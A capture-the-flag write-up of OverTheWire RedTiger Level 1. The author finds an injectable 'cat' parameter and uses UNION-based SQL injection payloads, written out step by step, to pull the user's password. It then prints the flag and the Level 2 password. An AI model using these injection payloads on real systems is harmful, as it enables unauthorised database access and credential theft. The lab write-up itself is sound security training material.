## Level 1

**URL:** https://redtiger.labs.overthewire.org/level1.php

**Target:** Get the login for the user Hornoxe

**Tablename:** level1_users

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502022328468.png" alt="image-20200502022328468" style="border:1px solid black;" />



Clicking on category 1 sent the value 1 to parameter "cat", and presented additional text. This might indicate a potential SQLi attack.

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502022636412.png" alt="image-20200502022636412" style="border:1px solid black;" />

<center> ?cat=1



I figured that the SQL query might look similar to this, where `[cat]` can be defined by me:

```sql
SELECT ?,?,... 
FROM ... 
WHERE cat=[cat] ... ;
```

I decided to use the `UNION` function to plot the requested password. For that to work, I wanted to bring the query to the following form:

```sql
SELECT ?,?,... 
FROM ... 
WHERE cat=1 
UNION 
SELECT password 
FROM level1_users; -- ...
```

I set `[cat]` to be `1 UNION SELECT password FROM level1_users; --` (adding "; -- " to make sure the rest of the query is ignored in case it exists).

The problem was I did not know how many columns the table has. I started adding columns to the selection until I reached the right number (4):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502023938850.png" alt="image-20200502023938850" style="border:1px solid black;" />

<center>?cat=1%20UNION%20SELECT%20password,2,3,4%20FROM%20level1_users;%20--



I could tell that columns 3 and 4 are presented to the user, so I made sure the column "password" is selected third:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502024312259.png" alt="image-20200502024312259" style="border:1px solid black;" />

<center> cat=1%20UNION%20SELECT%201,2,password,4%20FROM%20level1_users;%20



And there it was! I used the password (**thatwaseasy**) to receive the flag (**27cbddc803ecde822d87a7e8639f9315**) and the password for Level 2 (**passwords_will_change_over_time_let_us_do_a_shitty_rhyme**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502024653899.png" alt="image-20200502024653899" style="border:1px solid black;" />
